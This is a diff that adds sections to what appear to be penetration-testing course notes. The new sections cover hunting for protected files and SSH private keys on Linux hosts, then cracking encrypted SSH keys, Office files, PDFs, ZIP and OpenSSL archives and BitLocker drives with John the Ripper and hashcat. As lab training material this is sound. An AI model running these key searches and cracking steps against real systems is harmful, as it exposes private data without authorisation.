@@ -133,7 +133,21 @@ Hacking linux
   - [Cracking Documents](#Cracking-Documents)
   - [Cracking Microsoft Office Documents](#Cracking-Microsoft-Office-Documents)
   - [Cracking PDFs](#Cracking-PDFs)
-- [](#)
+- [Protected Archives](#Protected-Archives)
+  - [Download All File Extensions](#Download-All-File-Extensions)
+  - [Cracking Archives](#Cracking-Archives)
+  - [Cracking ZIP](#Cracking-ZIP)
+  - [Using zip2john](#Using-zip2john)
+  - [Viewing the Contents of zip hash](#Viewing-the-Contents-of-zip-hash)
+  - [Cracking the Hash with John](#Cracking-the-Hash-with-John)
+  - [Viewing the Cracked Hash](#Viewing-the-Cracked-Hash)
+  - [Cracking OpenSSL Encrypted Archives](#Cracking-OpenSSL-Encrypted-Archives)
+  - [Using a for-loop to Display Extracted Contents](#Using-a-for-loop-to-Display-Extracted-Contents)
+  - [Cracking BitLocker Encrypted Drives](#Cracking-BitLocker-Encrypted-Drives)
+  - [Using bitlocker2john](#Using-bitlocker2john)
+  - Using hashcat to Crack backup hash[](#Using-hashcat-to-Crack-backup-hash)
+  - [Viewing the Cracked Hash 2](#Viewing-the-Cracked-Hash-2)
+  - [Windows - Mounting BitLocker VHD](#Windows---Mounting-BitLocker-VHD)
  
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -1830,6 +1844,380 @@ https://github.com/CiscoCXSecurity/linikatz
 is a tool created by Cisco's security team for exploiting credentials on Linux machines when there is an integration with Active Directory. In other words, Linikatz brings a similar principle to Mimikatz to UNIX environments.
 
 Just like Mimikatz, to take advantage of Linikatz, we need to be root on the machine. This tool will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. Once it extracts the credentials, it places them in a folder whose name starts with linikatz.. Inside this folder, you will find the credentials in the different available formats, including ccache and keytabs. These can be used, as appropriate, as explained above.
+  
+
+## Protected Files
+
+The use of file encryption is often still lacking in private and business matters. Even today, emails containing job applications, account statements, or contracts are often sent unencrypted. This is grossly negligent and, in many cases, even punishable by law. For example, GDPR demands the requirement for encrypted storage and transmission of personal data in the European Union. Especially in business cases, this is quite different for emails. Nowadays, it is pretty common to communicate confidential topics or send sensitive data by email. However, emails are not much more secure than postcards, which can be intercepted if the attacker is positioned correctly.
+
+More and more companies are increasing their IT security precautions and infrastructure through training courses and security awareness seminars. As a result, it is becoming increasingly common for company employees to encrypt/encode sensitive files. Nevertheless, even these can be cracked and read with the right choice of lists and tools. In many cases, symmetric encryption like AES-256 is used to securely store individual files or folders. Here, the same key is used to encrypt and decrypt a file.
+
+Therefore, for sending files, asymmetric encryption is used, in which two separate keys are required. The sender encrypts the file with the public key of the recipient. The recipient, in turn, can then decrypt the file using a private key.
+
+## Hunting for Encoded Files
+
+Many different file extensions can identify these types of encrypted/encoded files. For example, a useful list can be found on FileInfo
+```
+https://fileinfo.com/filetypes/encoded
+```
+However, for our example, we will only look at the most common files like the following:
+
+## Hunting for Files
+```
+for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
+```
+If we encounter file extensions on the system that we are not familiar with, we can use the search engines that we are familiar with to find out the technology behind them. After all, there are hundreds of different file extensions, and no one is expected to know all of them by heart. First, however, we should know how to find the relevant information that will help us. Again, we can use the steps we already covered in the Credential Hunting sections or repeat them to find SSH keys on the system.
+
+## Hunting for SSH Keys
+```
+grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
+```
+Most SSH keys we will find nowadays are encrypted. We can recognize this by the header of the SSH key because this shows the encryption method in use.
+
+## Encrypted SSH Keys
+example
+```
+cry0l1t3@unixclient:~$ cat /home/cry0l1t3/.ssh/SSH.private
+
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2109D25CC91F8DBFCEB0F7589066B2CC
+
+8Uboy0afrTahejVGmB7kgvxkqJLOczb1I0/hEzPU1leCqhCKBlxYldM2s65jhflD
+4/OH4ENhU7qpJ62KlrnZhFX8UwYBmebNDvG12oE7i21hB/9UqZmmHktjD3+OYTsD
+...SNIP...
+```
+If we see such a header in an SSH key, we will, in most cases, not be able to use it immediately without further action. This is because encrypted SSH keys are protected with a passphrase that must be entered before use. However, many are often careless in the password selection and its complexity because SSH is considered a secure protocol, and many do not know that even lightweight AES-128-CBC
+```
+https://en.wikipedia.org/wiki/Advanced_Encryption_Standard
+```
+can be cracked.
+
+## Cracking with John
+
+John The Ripper has many different scripts to generate hashes from files that we can then use for cracking. We can find these scripts on our system using the following command.
+```
+Suljov@htb[/htb]$ locate *2john*
+
+/usr/bin/bitlocker2john
+/usr/bin/dmg2john
+/usr/bin/gpg2john
+/usr/bin/hccap2john
+/usr/bin/keepass2john
+/usr/bin/putty2john
+/usr/bin/racf2john
+/usr/bin/rar2john
+/usr/bin/uaf2john
+/usr/bin/vncpcap2john
+/usr/bin/wlanhcx2john
+/usr/bin/wpapcap2john
+/usr/bin/zip2john
+/usr/share/john/1password2john.py
+/usr/share/john/7z2john.pl
+/usr/share/john/DPAPImk2john.py
+/usr/share/john/adxcsouf2john.py
+/usr/share/john/aem2john.py
+/usr/share/john/aix2john.pl
+/usr/share/john/aix2john.py
+/usr/share/john/andotp2john.py
+/usr/share/john/androidbackup2john.py
+...SNIP...
+```
+We can convert many different formats into single hashes and try to crack the passwords with this. Then, we can open, read, and use the file if we succeed. There is a Python script called ssh2john.py for SSH keys, which generates the corresponding hashes for encrypted SSH keys, which we can then store in files.
+```
+Suljov@htb[/htb]$ ssh2john.py SSH.private > ssh.hash
+Suljov@htb[/htb]$ cat ssh.hash 
+
+ssh.private:$sshng$0$8$1C258238FD2D6EB0$2352$f7b...SNIP...
+```
+
+Next, we need to customize the commands accordingly with the password list and specify our file with the hashes as the target to be cracked. After that, we can display the cracked hashes by specifying the hash file and using the --show option.
+
+## Cracking SSH Keys
+``` 
+Suljov@htb[/htb]$ john --wordlist=rockyou.txt ssh.hash
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+1234         (SSH.private)
+1g 0:00:00:00 DONE (2022-02-08 03:03) 16.66g/s 1747Kp/s 1747Kc/s 1747KC/s Knightsing..Babying
+Session completed
+``` 
+
+```
+Suljov@htb[/htb]$ john ssh.hash --show
+
+SSH.private:1234
+
+1 password hash cracked, 0 left
+```
+
+## Cracking Documents
+
+In the course of our career, we will come across many different documents, which are also password-protected to prevent access by unauthorized persons. Today, most people use Office and PDF files to exchange business information and data.
+
+Pretty much all reports, documentation, and information sheets can be found in the form of Office DOCs and PDFs. This is because they offer the best visual representation of information. John provides a Python script called office2john.py to extract hashes from all common Office documents that can then be fed into John or Hashcat for offline cracking. The procedure to crack them remains the same.
+
+## Cracking Microsoft Office Documents
+```
+Suljov@htb[/htb]$ office2john.py Protected.docx > protected-docx.hash
+Suljov@htb[/htb]$ cat protected-docx.hash
+
+Protected.docx:$office$*2007*20*128*16*7240...SNIP...8a69cf1*98242f4da37d916305d8e2821360773b7edc481b
+```
+```
+Suljov@htb[/htb]$ john --wordlist=rockyou.txt protected-docx.hash
+
+Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
+Cost 1 (MS Office version) is 2007 for all loaded hashes
+Cost 2 (iteration count) is 50000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+1234             (Protected.docx)
+1g 0:00:00:00 DONE (2022-02-08 01:25) 2.083g/s 2266p/s 2266c/s 2266C/s trisha..heart
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+```
+Suljov@htb[/htb]$ john protected-docx.hash --show
+
+Protected.docx:1234
+```
+
+## Cracking PDFs
+```
+Suljov@htb[/htb]$ pdf2john.py PDF.pdf > pdf.hash
+Suljov@htb[/htb]$ cat pdf.hash 
+
+PDF.pdf:$pdf$2*3*128*-1028*1*16*7e88...SNIP...bd2*32*a72092...SNIP...0000*32*c48f001fdc79a030d718df5dbbdaad81d1f6fedec4a7b5cd980d64139edfcb7e
+```
+```
+Suljov@htb[/htb]$ john --wordlist=rockyou.txt pdf.hash
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
+Cost 1 (revision) is 3 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+1234             (PDF.pdf)
+1g 0:00:00:00 DONE (2022-02-08 02:16) 25.00g/s 27200p/s 27200c/s 27200C/s bulldogs..heart
+Use the "--show --format=PDF" options to display all of the cracked passwords reliably
+Session completed
+```
+
+```
+Suljov@htb[/htb]$ john pdf.hash --show
+
+PDF.pdf:1234
+
+1 password hash cracked, 0 left
+```
+One of the major difficulties in this process is the generation and mutation of password lists. This is the prerequisite for successfully cracking the passwords for all password-protected files and access points. This is because it is often no longer sufficient to use a known password list in most cases, as these are known to the systems and are often recognized and blocked by integrated security mechanisms. These types of files may be more difficult to crack (or not crackable at all within a reasonable amount of time) because users may be forced to select a longer, randomly generated password or a passphrase. Nevertheless, it is always worth attempting to crack password-protected documents as they may yield sensitive data that could be useful to further our access.
+
+
+## Protected Archives
+
+Besides standalone files, there is also another format of files that can contain not only data, such as an Office document or a PDF, but also other files within them. This format is called an archive or compressed file that can be protected with a password if necessary.
+
+Let us assume an employee's role in an administrative company and imagine that our customer wants to summarize analysis in different formats, such as Excel, PDF, Word, and a corresponding presentation. One solution would be to send these files individually, but if we extend this example to a large company dealing with several projects running simultaneously, this type of file transfer can become cumbersome and lead to individual files being lost. In these cases, employees often rely on archives, which allow them to split all the necessary files in a structured way according to the projects (often in subfolders), summarize them, and pack them into a single file.
+
+There are many types of archive files. Some common file extensions include, but are not limited to:
+
+![image](https://user-images.githubusercontent.com/24814781/204614881-11c62e51-b592-488f-8830-873d09d5ea18.png)
+
+An extensive list of archive types can be found on FileInfo.com
+```
+https://fileinfo.com/filetypes/compressed
+```
+
+However, instead of manually typing them out, we can also query them using a one-liner, filter them out, and save them to a file if needed. At the time of writing, there are 337archive file types listed on fileinfo.com.
+
+## Download All File Extensions
+```
+Suljov@htb[/htb]$ curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
+
+.mint
+.htmi 
+.tpsr
+.mpkg  
+.arduboy
+.ice
+.sifz 
+.fzpz 
+.rar     
+.comppkg.hauptwerk.rar
+...SNIP...
+```
+
+It is important to note that not all of the above archives support password protection. Other tools are often used to protect the corresponding archives with a password. For example, with tar, the tool openssl or gpg is used to encrypt the archives.
+
+## Cracking Archives
+
+Given the number of different archives and the combination of tools, we will show only some of the possible ways to crack specific archives in this section. When it comes to password-protected archives, we typically need certain scripts that allow us to extract the hashes from the protected files and use them to crack the password of those.
+
+The .zip format is often heavily used in Windows environments to compress many files into one file. The procedure we have already seen remains the same except for using a different script to extract the hashes.
+
+
+## Cracking ZIP
+
+### Using zip2john
+```
+Suljov@htb[/htb]$ zip2john ZIP.zip > zip.hash
+
+ver 2.0 efh 5455 efh 7875 ZIP.zip/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=42, decmplen=30, crc=490E7510
+```
+
+By extracting the hashes, we will also see which files are in the ZIP archive.
+
+## Viewing the Contents of zip hash
+```
+Suljov@htb[/htb]$ cat zip.hash 
+
+ZIP.zip/customers.csv:$pkzip2$1*2*2*0*2a*1e*490e7510*0*42*0*2a*490e*409b*ef1e7feb7c1cf701a6ada7132e6a5c6c84c032401536faf7493df0294b0d5afc3464f14ec081cc0e18cb*$/pkzip2$:customers.csv:ZIP.zip::ZIP.zip
+```
+
+Once we have extracted the hash, we can now use john again to crack it with the desired password list. Because if john cracks it successfully, it will show us the corresponding password that we can use to open the ZIP archive.
+
+## Cracking the Hash with John
+```
+Suljov@htb[/htb]$ john --wordlist=rockyou.txt zip.hash
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+1234             (ZIP.zip/customers.csv)
+1g 0:00:00:00 DONE (2022-02-09 09:18) 100.0g/s 250600p/s 250600c/s 250600C/s 123456..1478963
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+## Viewing the Cracked Hash
+```
+Suljov@htb[/htb]$ john zip.hash --show
+
+ZIP.zip/customers.csv:1234:customers.csv:ZIP.zip::ZIP.zip
+
+1 password hash cracked, 0 left
+```
+
+## Cracking OpenSSL Encrypted Archives
+
+Furthermore, it is not always directly apparent whether the archive found is password-protected, especially if a file extension is used that does not support password protection. As we have already discussed, openssl can be used to encrypt the gzip format as an example. Using the tool file, we can obtain information about the specified file's format. This could look like this, for example:
+
+## Listing the Files
+```
+Suljov@htb[/htb]$ ls
+
+GZIP.gzip  rockyou.txt
+```
+
+## Using file
+```
+Suljov@htb[/htb]$ file GZIP.gzip 
+
+GZIP.gzip: openssl enc'd data with salted password
+```
+When cracking OpenSSL encrypted files and archives, we can encounter many different difficulties that will bring many false positives or even fail to guess the correct password. Therefore, the safest choice for success is to use the openssl tool in a for-loop that tries to extract the files from the archive directly if the password is guessed correctly.
+
+The following one-liner will show many errors related to the GZIP format, which we can ignore. If we have used the correct password list, as in this example, we will see that we have successfully extracted another file from the archive.
+
+## Using a for-loop to Display Extracted Contents
+```
+Suljov@htb[/htb]$ for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
+
+gzip: stdin: not in gzip format
+tar: Child returned status 1
+tar: Error is not recoverable: exiting now
+
+gzip: stdin: not in gzip format
+tar: Child returned status 1
+tar: Error is not recoverable: exiting now
+
+<SNIP>
+```
+Once the for-loop has finished, we can look in the current folder again to check if the cracking of the archive was successful.
+
+## Listing the Contents of the Cracked Archive
+```
+Suljov@htb[/htb]$ ls
+
+customers.csv  GZIP.gzip  rockyou.txt
+```
+
+## Cracking BitLocker Encrypted Drives
+
+BitLocker
+```
+https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-device-encryption-overview-windows-10
+```
+is an encryption program for entire partitions and external drives. Microsoft developed it for the Windows operating system. It has been available since Windows Vista and uses the AES encryption algorithm with 128-bit or 256-bit length. If the password or PIN for BitLocker is forgotten, we can use the recovery key to decrypt the partition or drive. The recovery key is a 48-digit string of numbers generated during BitLocker setup that also can be brute-forced.
+
+Virtual drives are often created in which personal information, notes, and documents are stored on the computer or laptop provided by the company to prevent access to this information by third parties. Again, we can use a script called bitlocker2john to extract the hash we need to crack. Four different hashes
+```
+https://openwall.info/wiki/john/OpenCL-BitLocker
+```
+
+will be extracted, which can be used with different Hashcat hash modes. For our example, we will work with the first one, which refers to the BitLocker password.
+
+## Using bitlocker2john
+```
+Suljov@htb[/htb]$ bitlocker2john -i Backup.vhd > backup.hashes
+Suljov@htb[/htb]$ grep "bitlocker\$0" backup.hashes > backup.hash
+Suljov@htb[/htb]$ cat backup.hash
+
+$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e...SNIP...70696f7eab6b
+```
+
+Both John and Hashcat can be used for this purpose. This example will look at the procedure with Hashcat. The Hashcat mode for cracking BitLocker hashes is -m 22100. So we provide Hashcat with the file with the one hash, specify our password list, and specify the hash mode. Since this is robust encryption (AES), cracking can take some time, depending on the hardware used. Additionally, we can specify the filename in which the result should be stored.
+
+
+## Using hashcat to Crack backup hash
+```
+Suljov@htb[/htb]$ hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
+
+hashcat (v6.1.1) starting...
+
+<SNIP>
+
+$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f:1234qwer
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: BitLocker
+Hash.Target......: $bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$10...8ec54f
+Time.Started.....: Wed Feb  9 11:46:40 2022 (1 min, 42 secs)
+Time.Estimated...: Wed Feb  9 11:48:22 2022 (0 secs)
+Guess.Base.......: File (/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:       28 H/s (8.79ms) @ Accel:32 Loops:4096 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 2880/6163 (46.73%)
+Rejected.........: 0/2880 (0.00%)
+Restore.Point....: 2816/6163 (45.69%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1044480-1048576
+Candidates.#1....: chemical -> secrets
+
+Started: Wed Feb  9 11:46:35 2022
+Stopped: Wed Feb  9 11:48:23 2022
+```
+
+## Viewing the Cracked Hash 2
+```
+Suljov@htb[/htb]$ cat backup.cracked 
+
+$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f:1234qwer
+``` 
+Once we have cracked the password, we will be able to open the encrypted drives. The easiest way to mount a BitLocker encrypted virtual drive is to transfer it to a Windows system and mount it. To do this, we only have to double-click on the virtual drive. Since it is password protected, Windows will show us an error. After mounting, we can again double-click BitLocker to prompt us for the password.
+
+![image](https://user-images.githubusercontent.com/24814781/204616296-ea2d3f65-53b3-48d3-9b44-cbd04f2798be.png)
+
 
 ----------------------------------------------------------------------------------------------------------------------------------------
 
